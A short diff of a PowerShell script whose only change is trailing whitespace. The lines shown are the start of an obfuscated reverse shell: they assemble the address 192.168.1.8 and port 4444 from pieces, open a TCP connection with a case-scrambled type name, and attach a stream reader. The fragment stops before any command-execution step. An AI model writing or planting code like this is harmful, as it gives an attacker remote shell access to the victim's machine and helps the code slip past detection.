@@ -1,4 +1,4 @@
-$v1 = "192"+".168"+".1."+"8"; $v2 = 4000+444; 
+$v1 = "192"+".168"+".1."+"8"; $v2 = 4000+444;  
 $T = New-Object "NeT.SOckEtS.TCPCliEnt"($v1,$v2);
 $S = $T.GetStream();
 $R = New-Object "IO.StreamReader"($S);
